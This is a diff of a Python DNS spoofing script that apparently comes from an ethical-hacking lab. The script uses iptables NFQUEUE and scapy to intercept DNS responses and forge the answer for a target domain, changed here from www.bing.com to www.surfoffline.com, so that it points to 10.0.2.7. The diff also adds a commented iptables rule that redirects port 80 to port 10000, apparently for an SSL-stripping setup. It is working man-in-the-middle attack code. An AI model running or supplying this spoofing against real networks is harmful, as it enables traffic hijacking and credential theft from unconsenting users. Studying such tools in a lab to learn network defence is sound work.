@@ -3,6 +3,7 @@
 #execute on your own pc by using iptables -I OUTPUT -j NFQUEUE --queue-num 0
 #and by using iptables -I INPUT -j NFQUEUE --queue-num 0
 #iptables --flush ///to delete
+#for https:-iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
 
 import netfilterqueue
 import scapy.all as scapy
@@ -10,10 +11,11 @@ import scapy.all as scapy
 
 def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())
-    print(scapy_packet.show())
+    #print(scapy_packet.show())
     if scapy_packet.haslayer(scapy.DNSRR):
+        print(scapy_packet.show())
         qname = scapy_packet[scapy.DNSQR].qname
-        if "www.bing.com" in qname:
+        if "www.surfoffline.com" in qname:
             print(scapy_packet.show())
             print("[+] Spoofing target...")
             answer = scapy.DNSRR(rrname=qname, rdata="10.0.2.7")
